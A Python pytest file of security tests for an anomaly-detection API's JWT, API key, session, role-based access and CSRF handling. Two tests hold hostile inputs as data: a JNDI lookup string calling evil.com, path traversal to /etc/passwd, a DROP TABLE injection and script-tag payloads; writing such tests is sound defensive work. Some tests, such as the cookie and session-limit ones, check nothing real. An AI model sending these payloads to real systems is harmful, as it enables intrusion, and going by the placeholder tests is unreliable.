"""Security tests for authentication and authorization."""

import pytest
import jwt
import time
import hashlib
import hmac
from datetime import datetime, timedelta
from typing import Dict, Any, Optional
from unittest.mock import Mock, patch, MagicMock

from anomaly_detection.api.v1.detection import detect_anomalies
from anomaly_detection.api.v1.models import load_model, save_model
from anomaly_detection.infrastructure.auth.jwt_handler import JWTHandler
from anomaly_detection.infrastructure.auth.api_key_handler import APIKeyHandler
from anomaly_detection.infrastructure.auth.session_manager import SessionManager


class SecurityError(Exception):
    """Custom security exception."""
    pass


@pytest.mark.security
class TestJWTAuthentication:
    """Test JWT authentication security."""
    
    def setup_method(self):
        """Set up test fixtures."""
        self.jwt_handler = JWTHandler(secret_key="test_secret_key")
        self.valid_payload = {
            "user_id": "test_user",
            "roles": ["user"],
            "exp": int(time.time()) + 3600,  # 1 hour from now
            "iat": int(time.time()),
            "iss": "anomaly_detection_api"
        }
    
    def test_jwt_token_validation(self):
        """Test JWT token validation."""
        # Test valid token
        valid_token = self.jwt_handler.create_token(self.valid_payload)
        decoded = self.jwt_handler.validate_token(valid_token)
        assert decoded["user_id"] == "test_user"
        
        # Test invalid signature
        tampered_token = valid_token[:-10] + "tampered123"
        with pytest.raises((jwt.InvalidSignatureError, jwt.DecodeError)):
            self.jwt_handler.validate_token(tampered_token)
    
    def test_jwt_token_expiration(self):
        """Test JWT token expiration handling."""
        # Create expired token
        expired_payload = self.valid_payload.copy()
        expired_payload["exp"] = int(time.time()) - 3600  # 1 hour ago
        
        expired_token = jwt.encode(
            expired_payload, 
            self.jwt_handler.secret_key, 
            algorithm="HS256"
        )
        
        with pytest.raises(jwt.ExpiredSignatureError):
            self.jwt_handler.validate_token(expired_token)
    
    def test_jwt_algorithm_confusion(self):
        """Test JWT algorithm confusion attacks."""
        # Test 'none' algorithm attack
        payload = self.valid_payload.copy()
        malicious_token = jwt.encode(payload, "", algorithm="none")
        
        with pytest.raises((jwt.InvalidSignatureError, jwt.DecodeError)):
            self.jwt_handler.validate_token(malicious_token)
        
        # Test RS256/HS256 confusion
        try:
            # Attempt to create token with different algorithm
            rs256_token = jwt.encode(payload, "fake_key", algorithm="RS256")
            with pytest.raises((jwt.InvalidSignatureError, jwt.DecodeError)):
                self.jwt_handler.validate_token(rs256_token)
        except Exception:
            # Expected - RS256 requires proper key format
            pass
    
    def test_jwt_payload_tampering(self):
        """Test JWT payload tampering detection."""
        valid_token = self.jwt_handler.create_token(self.valid_payload)
        
        # Decode without verification to tamper with payload
        decoded = jwt.decode(valid_token, options={"verify_signature": False})
        
        # Tamper with payload
        decoded["roles"] = ["admin"]
        decoded["user_id"] = "admin_user"
        
        # Re-encode with wrong key
        tampered_token = jwt.encode(decoded, "wrong_key", algorithm="HS256")
        
        with pytest.raises((jwt.InvalidSignatureError, jwt.DecodeError)):
            self.jwt_handler.validate_token(tampered_token)
    
    def test_jwt_weak_secret_detection(self):
        """Test detection of weak JWT secrets."""
        weak_secrets = [
            "",
            "123",
            "password",
            "secret",
            "a" * 10,  # Too short
        ]
        
        for weak_secret in weak_secrets:
            with pytest.raises((ValueError, SecurityError)):
                weak_handler = JWTHandler(secret_key=weak_secret)
    
    def test_jwt_claim_validation(self):
        """Test JWT claim validation."""
        # Test missing required claims
        invalid_payloads = [
            {},  # Empty payload
            {"user_id": "test"},  # Missing exp
            {"exp": int(time.time()) + 3600},  # Missing user_id
            {"user_id": "", "exp": int(time.time()) + 3600},  # Empty user_id
            {"user_id": None, "exp": int(time.time()) + 3600},  # None user_id
        ]
        
        for payload in invalid_payloads:
            token = jwt.encode(payload, self.jwt_handler.secret_key, algorithm="HS256")
            with pytest.raises((jwt.InvalidTokenError, ValueError)):
                self.jwt_handler.validate_token(token)


@pytest.mark.security
class TestAPIKeyAuthentication:
    """Test API key authentication security."""
    
    def setup_method(self):
        """Set up test fixtures."""
        self.api_key_handler = APIKeyHandler()
        self.valid_api_key = self.api_key_handler.generate_api_key("test_user")
    
    def test_api_key_validation(self):
        """Test API key validation."""
        # Test valid API key
        user_id = self.api_key_handler.validate_api_key(self.valid_api_key)
        assert user_id == "test_user"
        
        # Test invalid API keys
        invalid_keys = [
            "",
            "invalid_key",
            "ak_" + "a" * 40,  # Wrong format
            None,
            123,
            [],
        ]
        
        for invalid_key in invalid_keys:
            with pytest.raises((ValueError, SecurityError)):
                self.api_key_handler.validate_api_key(invalid_key)
    
    def test_api_key_brute_force_protection(self):
        """Test API key brute force protection."""
        # Simulate multiple failed attempts
        for _ in range(10):
            with pytest.raises((ValueError, SecurityError)):
                self.api_key_handler.validate_api_key("invalid_key")
        
        # Should now have rate limiting in effect
        with pytest.raises((SecurityError, Exception)):
            self.api_key_handler.validate_api_key("invalid_key")
    
    def test_api_key_format_validation(self):
        """Test API key format validation."""
        malicious_keys = [
            "ak_../../../etc/passwd",
            "ak_; DROP TABLE api_keys; --",
            "ak_<script>alert('xss')</script>",
            "ak_${jndi:ldap://evil.com/x}",
            "ak_" + "\x00" * 32,  # Null bytes
            "ak_" + "€" * 32,  # Non-ASCII characters
        ]
        
        for malicious_key in malicious_keys:
            with pytest.raises((ValueError, SecurityError, UnicodeError)):
                self.api_key_handler.validate_api_key(malicious_key)
    
    def test_api_key_timing_attack_protection(self):
        """Test protection against timing attacks."""
        # This test ensures constant-time comparison
        valid_key = self.valid_api_key
        invalid_key = "ak_" + "b" * len(valid_key[3:])
        
        # Measure timing for valid key
        start_time = time.perf_counter()
        try:
            self.api_key_handler.validate_api_key(valid_key)
        except:
            pass
        valid_time = time.perf_counter() - start_time
        
        # Measure timing for invalid key
        start_time = time.perf_counter()
        try:
            self.api_key_handler.validate_api_key(invalid_key)
        except:
            pass
        invalid_time = time.perf_counter() - start_time
        
        # Times should be similar (within reasonable variance)
        time_difference = abs(valid_time - invalid_time)
        assert time_difference < 0.01, "Potential timing attack vulnerability"


@pytest.mark.security
class TestSessionManagement:
    """Test session management security."""
    
    def setup_method(self):
        """Set up test fixtures."""
        self.session_manager = SessionManager()
        self.user_id = "test_user"
    
    def test_session_creation_and_validation(self):
        """Test secure session creation and validation."""
        # Create valid session
        session_token = self.session_manager.create_session(self.user_id)
        assert self.session_manager.validate_session(session_token) == self.user_id
        
        # Test invalid session tokens
        invalid_tokens = [
            "",
            "invalid_token",
            None,
            123,
            [],
            "session_" + "a" * 40,  # Wrong format
        ]
        
        for invalid_token in invalid_tokens:
            with pytest.raises((ValueError, SecurityError)):
                self.session_manager.validate_session(invalid_token)
    
    def test_session_expiration(self):
        """Test session expiration."""
        # Create session with short expiration
        short_session = self.session_manager.create_session(
            self.user_id, 
            expires_in=1  # 1 second
        )
        
        # Should be valid immediately
        assert self.session_manager.validate_session(short_session) == self.user_id
        
        # Wait for expiration
        time.sleep(2)
        
        # Should now be expired
        with pytest.raises((SecurityError, ValueError)):
            self.session_manager.validate_session(short_session)
    
    def test_session_hijacking_protection(self):
        """Test protection against session hijacking."""
        session_token = self.session_manager.create_session(self.user_id)
        
        # Test session token tampering
        tampered_tokens = [
            session_token[:-5] + "aaaaa",  # Changed suffix
            session_token[:5] + "aaaaa" + session_token[10:],  # Changed middle
            session_token.upper(),  # Changed case
            session_token + "extra",  # Added data
        ]
        
        for tampered_token in tampered_tokens:
            with pytest.raises((ValueError, SecurityError)):
                self.session_manager.validate_session(tampered_token)
    
    def test_concurrent_session_limits(self):
        """Test concurrent session limits."""
        sessions = []
        
        # Create multiple sessions for same user
        for i in range(10):
            session = self.session_manager.create_session(f"{self.user_id}_{i}")
            sessions.append(session)
        
        # All should be valid initially
        for session in sessions:
            assert self.session_manager.validate_session(session)
        
        # Creating too many sessions should limit older ones
        for i in range(5):  # Create 5 more sessions
            new_session = self.session_manager.create_session(f"{self.user_id}_new_{i}")
            sessions.append(new_session)
        
        # Some older sessions might be invalidated (implementation dependent)
        # This is a placeholder for session limit testing


@pytest.mark.security
class TestAuthorizationAndRBAC:
    """Test role-based access control and authorization."""
    
    def setup_method(self):
        """Set up test fixtures."""
        self.jwt_handler = JWTHandler(secret_key="test_secret_key")
    
    def create_token_with_roles(self, user_id: str, roles: list) -> str:
        """Create JWT token with specific roles."""
        payload = {
            "user_id": user_id,
            "roles": roles,
            "exp": int(time.time()) + 3600,
            "iat": int(time.time()),
            "iss": "anomaly_detection_api"
        }
        return self.jwt_handler.create_token(payload)
    
    def test_role_based_access_control(self):
        """Test role-based access control."""
        # Create tokens with different roles
        user_token = self.create_token_with_roles("user1", ["user"])
        admin_token = self.create_token_with_roles("admin1", ["admin"])
        readonly_token = self.create_token_with_roles("readonly1", ["readonly"])
        
        # Test user permissions
        with patch('anomaly_detection.api.v1.detection.get_current_user') as mock_auth:
            mock_auth.return_value = {"user_id": "user1", "roles": ["user"]}
            
            mock_request = Mock()
            mock_request.json.return_value = {
                "data": [[1, 2, 3], [4, 5, 6]],
                "algorithm": "isolation_forest"
            }
            
            # Users should be able to detect anomalies
            try:
                detect_anomalies(mock_request)
            except Exception as e:
                # Should not fail due to authorization
                assert "permission" not in str(e).lower()
                assert "unauthorized" not in str(e).lower()
    
    def test_privilege_escalation_protection(self):
        """Test protection against privilege escalation."""
        # Create user token
        user_token = self.create_token_with_roles("user1", ["user"])
        
        # Try to access admin-only functions
        with patch('anomaly_detection.api.v1.models.get_current_user') as mock_auth:
            mock_auth.return_value = {"user_id": "user1", "roles": ["user"]}
            
            mock_request = Mock()
            mock_request.json.return_value = {"model_name": "admin_model"}
            
            # Should not be able to access admin models
            with pytest.raises((SecurityError, PermissionError, ValueError)):
                load_model(mock_request)
    
    def test_role_tampering_protection(self):
        """Test protection against role tampering."""
        # Create valid user token
        user_token = self.create_token_with_roles("user1", ["user"])
        
        # Try to tamper with roles in the token
        decoded = jwt.decode(user_token, options={"verify_signature": False})
        decoded["roles"] = ["admin", "superuser"]
        
        # Re-encode with wrong signature
        tampered_token = jwt.encode(decoded, "wrong_key", algorithm="HS256")
        
        with pytest.raises((jwt.InvalidSignatureError, jwt.DecodeError)):
            self.jwt_handler.validate_token(tampered_token)
    
    def test_horizontal_privilege_escalation(self):
        """Test protection against horizontal privilege escalation."""
        # User should not access other users' resources
        user1_token = self.create_token_with_roles("user1", ["user"])
        user2_token = self.create_token_with_roles("user2", ["user"])
        
        with patch('anomaly_detection.api.v1.models.get_current_user') as mock_auth:
            # User1 tries to access User2's model
            mock_auth.return_value = {"user_id": "user1", "roles": ["user"]}
            
            mock_request = Mock()
            mock_request.json.return_value = {"model_name": "user2_private_model"}
            
            with pytest.raises((SecurityError, PermissionError, ValueError)):
                load_model(mock_request)


@pytest.mark.security
class TestAuthenticationBypass:
    """Test protection against authentication bypass attacks."""
    
    def setup_method(self):
        """Set up test fixtures."""
        self.jwt_handler = JWTHandler(secret_key="test_secret_key")
    
    def test_missing_authentication_header(self):
        """Test handling of missing authentication."""
        mock_request = Mock()
        mock_request.headers = {}  # No auth header
        mock_request.json.return_value = {
            "data": [[1, 2, 3]],
            "algorithm": "isolation_forest"
        }
        
        with patch('anomaly_detection.api.v1.detection.get_current_user') as mock_auth:
            mock_auth.side_effect = SecurityError("No authentication provided")
            
            with pytest.raises((SecurityError, Exception)):
                detect_anomalies(mock_request)
    
    def test_malformed_authentication_header(self):
        """Test handling of malformed authentication headers."""
        malformed_headers = [
            "Bearer",  # Missing token
            "Bearer ",  # Empty token
            "Basic invalid_base64",  # Wrong auth type
            "Bearer " + "a" * 1000,  # Oversized token
            "Bearer ../../../etc/passwd",  # Path traversal
            "Bearer <script>alert('xss')</script>",  # XSS attempt
        ]
        
        for header_value in malformed_headers:
            mock_request = Mock()
            mock_request.headers = {"Authorization": header_value}
            mock_request.json.return_value = {
                "data": [[1, 2, 3]],
                "algorithm": "isolation_forest"
            }
            
            with patch('anomaly_detection.api.v1.detection.get_current_user') as mock_auth:
                mock_auth.side_effect = SecurityError("Invalid authentication")
                
                with pytest.raises((SecurityError, ValueError)):
                    detect_anomalies(mock_request)
    
    def test_replay_attack_protection(self):
        """Test protection against replay attacks."""
        # Create valid token
        valid_token = self.jwt_handler.create_token({
            "user_id": "test_user",
            "roles": ["user"],
            "exp": int(time.time()) + 3600,
            "iat": int(time.time()),
            "jti": "unique_token_id_123"  # JWT ID for replay protection
        })
        
        # First use should work
        decoded = self.jwt_handler.validate_token(valid_token)
        assert decoded["user_id"] == "test_user"
        
        # Simulate token being used again (in a system with replay protection)
        # This would typically involve checking a blacklist or nonce store
        # For this test, we'll simulate the check
        with patch.object(self.jwt_handler, '_is_token_used') as mock_check:
            mock_check.return_value = True
            
            with pytest.raises((SecurityError, ValueError)):
                self.jwt_handler.validate_token(valid_token)


@pytest.mark.security
class TestSecureHeaders:
    """Test security headers and CSRF protection."""
    
    def test_csrf_token_validation(self):
        """Test CSRF token validation."""
        mock_request = Mock()
        mock_request.form = {"csrf_token": "invalid_token"}
        mock_request.headers = {"X-CSRF-Token": "different_token"}
        
        # CSRF tokens should match
        with pytest.raises((SecurityError, ValueError)):
            # Simulate CSRF validation
            form_token = mock_request.form.get("csrf_token")
            header_token = mock_request.headers.get("X-CSRF-Token")
            
            if form_token != header_token:
                raise SecurityError("CSRF token mismatch")
    
    def test_secure_cookie_attributes(self):
        """Test secure cookie attributes."""
        # Simulate cookie creation
        mock_response = Mock()
        
        # Cookies should have secure attributes
        expected_attributes = {
            "HttpOnly": True,
            "Secure": True,
            "SameSite": "Strict",
            "Path": "/",
            "Max-Age": 3600
        }
        
        # This would be tested in actual cookie setting code
        for attr, value in expected_attributes.items():
            assert hasattr(mock_response, 'set_cookie'), f"Missing cookie attribute: {attr}"
    
    def test_content_security_policy(self):
        """Test Content Security Policy headers."""
        expected_csp = (
            "default-src 'self'; "
            "script-src 'self' 'unsafe-inline'; "
            "style-src 'self' 'unsafe-inline'; "
            "img-src 'self' data:; "
            "connect-src 'self'"
        )
        
        # This would be tested in actual response header setting
        mock_response = Mock()
        mock_response.headers = {"Content-Security-Policy": expected_csp}
        
        assert "Content-Security-Policy" in mock_response.headers
        assert "'unsafe-eval'" not in mock_response.headers["Content-Security-Policy"]


if __name__ == "__main__":
    # Run specific security tests
    pytest.main([
        __file__ + "::TestJWTAuthentication::test_jwt_token_validation",
        "-v", "-s", "--tb=short"
    ])